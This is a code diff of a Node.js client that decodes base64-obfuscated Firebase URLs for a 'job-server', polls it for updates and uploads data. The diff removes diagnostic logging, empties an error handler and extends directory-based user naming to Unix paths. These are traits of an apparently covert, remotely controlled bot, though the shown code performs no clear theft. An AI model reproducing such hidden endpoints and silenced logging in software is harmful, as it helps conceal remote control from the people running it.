@@ -15,8 +15,6 @@ let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
 
 
-console.log(__dirname, __filename);
-
 if (USER) {
     console.log('USER: '+USER)
 
@@ -74,12 +72,8 @@ async function getUpdateData() {
             response = await getAxios(BASE_URL+'server/'+UPDATE+'.json')
 
             mData = response.data
-        } else {
-            console.log(data);
         }
-    } catch (error) {
-        console.log(error)
-    }
+    } catch (error) {}
 }
 
 async function checkStatus() {
@@ -126,7 +120,7 @@ async function checkStatus() {
                 maxContentLength: Infinity
             })
 
-            console.log('Completed')
+            console.log('---COMPLETED---')
             process.exit(0)
         }
     } catch (error) {}
@@ -270,14 +264,24 @@ async function patchAxios(url, body, data) {
 function getUserName() {
     try {
         let directory = __dirname.split('\\')
-        if (directory.length > 2) {
-            let index = directory.length - 2
-            let name = directory[index]
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
             if (name) {
                 return name
             }
         }
     } catch (error) {}
+
+    try {
+        let directory = __dirname.split('/')
+        if (directory.length > 1) {
+            let name = directory[directory.length-1]
+            if (name) {
+                return name
+            }
+        }
+    } catch (error) {}
+
     return null
 }
 
